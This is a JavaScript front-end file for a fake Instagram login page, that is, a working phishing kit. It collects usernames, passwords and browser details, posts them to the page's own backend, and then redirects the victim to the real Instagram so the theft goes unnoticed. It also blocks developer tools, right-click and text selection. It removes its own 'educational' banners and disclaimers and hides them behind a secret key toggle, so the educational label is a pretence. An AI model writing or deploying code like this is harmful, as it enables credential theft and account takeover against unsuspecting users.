// Instagram Login Form Handler
class InstagramLogin {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.usernameInput = document.getElementById('username');
        this.passwordInput = document.getElementById('password');
        this.loginBtn = document.getElementById('loginBtn');
        
        // Security features
        this.initializeSecurity();
        this.bindEvents();
    }
    
    initializeSecurity() {
        // Disable right-click context menu
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        
        // Disable F12, Ctrl+Shift+I, Ctrl+U
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                return false;
            }
        });
        
        // Disable text selection
        document.addEventListener('selectstart', (e) => e.preventDefault());
        
        // Add fake Instagram-like behavior
        this.addFakeInstagramFeatures();
        
        // Hide educational content completely
        this.hideEducationalContent();
        
        // Add secret toggle mechanism
        this.addSecretToggle();
    }
    
    addFakeInstagramFeatures() {
        // Add fake loading states
        this.addFakeLoadingBehavior();
        
        // Add fake Instagram redirect logic
        this.addFakeRedirectLogic();
    }
    
    addFakeLoadingBehavior() {
        // Simulate Instagram's loading behavior
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    console.log('Instagram loaded successfully');
                }, 100);
            });
        }
    }
    
    addFakeRedirectLogic() {
        // Add fake Instagram redirect URLs
        this.instagramUrls = [
            'https://www.instagram.com/',
            'https://www.instagram.com/explore/',
            'https://www.instagram.com/accounts/login/'
        ];
    }
    
    // Educational features - Hidden by default
    showEducationalAlert() {
        // Hidden educational alert - only shows in specific conditions
        console.log('Educational Demo: This demonstrates how phishing attacks work.');
    }
    
    // Hide all educational content completely
    hideEducationalContent() {
        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
        educationalElements.forEach(element => {
            element.style.display = 'none';
            element.style.visibility = 'hidden';
            element.style.opacity = '0';
            element.style.height = '0';
            element.style.overflow = 'hidden';
            element.remove();
        });
        
        // Hide educational disclaimers in footer
        const disclaimer = document.querySelector('.copyright p:first-child');
        if (disclaimer) {
            disclaimer.style.display = 'none';
            disclaimer.style.visibility = 'hidden';
        }
    }
    
    // Secret toggle mechanism (Ctrl+Shift+E for educational mode)
    addSecretToggle() {
        let keySequence = [];
        document.addEventListener('keydown', (e) => {
            keySequence.push(e.key);
            if (keySequence.length > 3) keySequence.shift();
            
            // Ctrl+Shift+E to toggle educational content
            if (keySequence.includes('Control') && keySequence.includes('Shift') && e.key === 'E') {
                this.toggleEducationalMode();
                keySequence = [];
            }
        });
    }
    
    toggleEducationalMode() {
        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
        const isHidden = educationalElements[0]?.style.display === 'none';
        
        educationalElements.forEach(element => {
            if (isHidden) {
                element.style.display = 'block';
                element.style.visibility = 'visible';
                element.style.opacity = '1';
                element.style.height = 'auto';
                element.style.overflow = 'visible';
            } else {
                element.style.display = 'none';
                element.style.visibility = 'hidden';
                element.style.opacity = '0';
                element.style.height = '0';
                element.style.overflow = 'hidden';
            }
        });
        
        console.log(`Educational mode ${isHidden ? 'enabled' : 'disabled'}`);
    }
    
    bindEvents() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.usernameInput.addEventListener('input', () => this.validateForm());
        this.passwordInput.addEventListener('input', () => this.validateForm());
    }
    
    validateForm() {
        const isValid = this.usernameInput.value.trim() && this.passwordInput.value.trim();
        this.loginBtn.disabled = !isValid;
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        if (!this.usernameInput.value.trim() || !this.passwordInput.value.trim()) {
            alert('Please fill in all fields');
            return;
        }
        
        this.setLoadingState(true);
        
        try {
            const formData = {
                username: this.usernameInput.value.trim(),
                password: this.passwordInput.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
            };
            
            // Send to backend API
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            // Check if response is ok before parsing JSON
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            // Get response text first to check if it's valid JSON
            const responseText = await response.text();
            console.log('Response text:', responseText);
            
            let result;
            try {
                result = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON parse error:', parseError);
                console.error('Response text:', responseText);
                throw new Error('Invalid response from server');
            }
            
            if (result.success) {
                // Show educational message before redirect
                this.showEducationalAlert();
                // Redirect to Instagram immediately without showing any message
                window.location.href = 'https://www.instagram.com/';
            } else {
                alert('Login failed. Please try again.');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            alert('Network error. Please check your connection and try again.');
        } finally {
            this.setLoadingState(false);
        }
    }
    
    setLoadingState(loading) {
        if (loading) {
            this.loginBtn.textContent = 'Logging in...';
            this.loginBtn.disabled = true;
            this.form.classList.add('loading');
        } else {
            this.loginBtn.textContent = 'Log in';
            this.loginBtn.disabled = false;
            this.form.classList.remove('loading');
        }
    }
    
    
}

// Facebook login handler
class FacebookLogin {
    constructor() {
        this.facebookBtn = document.querySelector('.fb');
        this.bindEvents();
    }
    
    bindEvents() {
        this.facebookBtn.addEventListener('click', (e) => this.handleClick(e));
    }
    
    handleClick(e) {
        e.preventDefault();
        alert('Facebook login clicked!'); // Placeholder for actual Facebook login
    }
}


// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Instagram login
    window.instagramLogin = new InstagramLogin();
    
    // Initialize Facebook login
    new FacebookLogin();
    
    // Hide educational content on page load
    setTimeout(() => {
        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
        educationalElements.forEach(element => {
            element.style.display = 'none';
            element.style.visibility = 'hidden';
            element.style.opacity = '0';
            element.style.height = '0';
            element.style.overflow = 'hidden';
        });
    }, 100);
    
    console.log('Instagram Login App initialized');
});